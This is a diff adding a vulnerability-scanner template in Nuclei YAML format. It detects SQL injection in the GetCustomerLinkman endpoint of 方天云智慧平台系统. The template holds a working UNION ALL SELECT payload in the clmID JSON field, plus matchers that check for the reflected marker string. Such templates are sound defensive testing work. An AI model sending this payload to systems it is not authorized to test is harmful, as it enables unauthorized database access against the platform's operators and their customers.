@@ -1,0 +1,31 @@
+id: poc-yaml-ftyerp-getcustomerlinkman-sqli
+info:
+  name: 方天云智慧平台系统 GetCustomerLinkman SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL injection vulnerability in the GetCustomerLinkman endpoint of 方天云智慧平台系统.
+
+http:
+  - raw:
+      - |
+        POST /WXAPI.asmx/GetCustomerLinkman HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"clmID":"1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(120)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(73)+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(122)+CHAR(113),NULL,NULL-- OSZH"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "qxzjqIqjxzq"
+          - "\"clmWW\":"
+      - type: word
+        part: header
+        words:
+          - "application/json"
